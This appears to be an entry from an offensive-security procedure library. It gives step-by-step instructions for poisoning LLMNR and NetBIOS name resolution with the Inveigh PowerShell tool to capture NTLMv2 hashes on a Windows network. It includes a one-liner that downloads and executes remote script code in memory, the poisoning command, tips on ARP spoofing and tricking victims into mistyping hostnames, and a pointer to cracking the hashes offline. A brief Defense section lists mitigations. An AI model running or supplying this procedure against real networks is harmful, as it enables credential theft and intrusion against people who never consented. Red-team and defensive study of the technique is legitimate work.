---
id: d6a7ff81-3b42-46e1-be74-48201307705d
name: Intercept-NTLMv2 Hashes via LLMNR and NetBIOS Requests (Windows)
type: procedure
verified: true
submitted: false
created_at: '2020-07-06T23:40:45.767101+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
  - '[[Credential Access]]'
techniques:
  - '[[LLMNR-NBT-NS Poisoning and SMB Relay]]'
sub_techniques: []
tags:
  - network
  - ntlm
commands:
  - '[[commands/inveigh-intercept-ntlmv2-hashes-llmnr-nbns]]'
platforms:
  - Windows
tools:
  - '[[tools/Inveigh]]'
validated: true
---

# Intercept-NTLMv2-Hashes-via-LLMNR-and-NetBIOS-Requests-Windows

## Summary

This procedure uses the Inveigh PowerShell module to perform LLMNR and NetBIOS name service (NBNS) poisoning on a Windows network, capturing NTLMv2 authentication hashes from name resolution requests without requiring elevated privileges. It is useful in lateral movement or credential access scenarios where victims misresolve names and attempt NTLM authentication to the attacker's controlled endpoint.

## Description

LLMNR and NBNS are legacy Windows protocols for resolving hostnames when DNS fails. Attackers exploit this by listening on the network for resolution requests (e.g., when a user types an incorrect hostname), poisoning the response to point to the attacker's IP, and then relaying or capturing the resulting NTLM authentication attempts. Inveigh automates this by spoofing responses and logging hashes to console or file. This technique targets internal networks and can capture domain credentials for offline cracking or relay attacks. It works on Windows 7+ where LLMNR is enabled by default, and no admin rights are needed on the attacker's machine if it's on the same broadcast domain.

## Requirements

1. A Windows machine positioned on the target network segment (same subnet for broadcast poisoning).
2. PowerShell execution policy allowing script execution (bypass if needed).
3. Network interface capable of promiscuous mode for sniffing (though Inveigh uses raw sockets).
4. Inveigh module downloaded and imported.
5. No elevated privileges required, but firewall must allow inbound connections on ports like 445 (SMB) or 80/443 for relays.

## Defense

- Disable LLMNR via Group Policy (Computer Configuration > Administrative Templates > Network > DNS Client > Turn off Multicast Name Resolution).
- Disable NBNS/NetBIOS over TCP/IP in network adapter settings.
- Enforce SMB signing and require NTLMv2 only (disable NTLMv1).
- Monitor network for anomalous DNS/LLMNR queries and unexpected NTLM auth attempts using tools like Sysmon or Windows Event Logs (Event ID 4624 for logons).
- Segment networks to limit broadcast domain exposure.

## Objectives

1. Poison LLMNR and NBNS responses to redirect authentication traffic.
2. Capture NTLMv2 hashes from victim authentication attempts.
3. Log hashes for offline cracking or further relay attacks.
4. Maintain persistence until hashes are obtained or manually stopped.

## Instructions

### Step 1: Download and Import Inveigh Module

**Context**: Obtain the Inveigh PowerShell module from its official repository to enable LLMNR/NBNS poisoning capabilities. This step ensures the tool is available without needing full installation.

Download the script from the GitHub repository using PowerShell:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1')
```

> This command fetches and executes the Inveigh script directly into memory. Expected output: No visible output if successful; the Inveigh functions (e.g., Invoke-Inveigh) become available in the session.

If issues arise with direct execution, manually download the .ps1 file and dot-source it: `. ./Inveigh.ps1`.

### Step 2: Start the Inveigh Listener for Hash Capture

**Context**: Launch Inveigh with LLMNR and NBNS enabled to begin poisoning and capturing hashes. Specify the local IP to bind to and enable console output for real-time monitoring. This step redirects victim name resolutions to the attacker's machine, prompting NTLM challenges.

**Command** ([[commands/inveigh-intercept-ntlmv2-hashes-llmnr-nbns]]):
```powershell
Invoke-Inveigh -LLMNR Y -NBNS Y -IP $_LISTEN_IP -ConsoleOutput Y
```

> Replace $_LISTEN_IP with your machine's IP on the target network (e.g., 10.10.10.100). This starts the listener, spoofs responses, and logs any NTLMv2 hashes captured from authentication attempts (e.g., when a victim accesses a poisoned share). Expected output: Startup banner confirming enabled features, followed by real-time logs of requests and captures like "[+] [IP] [USER]::DOMAIN:challenge:hash".

Monitor the console for hash captures. To increase capture chances, trigger resolutions by ARP poisoning or social engineering victims to mistype hostnames.

### Step 3: Stop the Listener and Review Captures

**Context**: Gracefully terminate the listener to end poisoning and export any captured hashes for cracking. This prevents unnecessary network noise and allows analysis of obtained credentials.

Execute the stop command:

```powershell
Stop-Inveigh
```

> This halts all Inveigh processes. Expected output: Confirmation message like "[*] Inveigh stopped". Review console logs for captured hashes; if file output was enabled (add -FileOutput Y), check the generated .csv for hashes.

Decision point: If no hashes captured, extend runtime or combine with ARP spoofing ([[tools/Ettercap]] or similar); otherwise, proceed to crack hashes using tools like Hashcat.
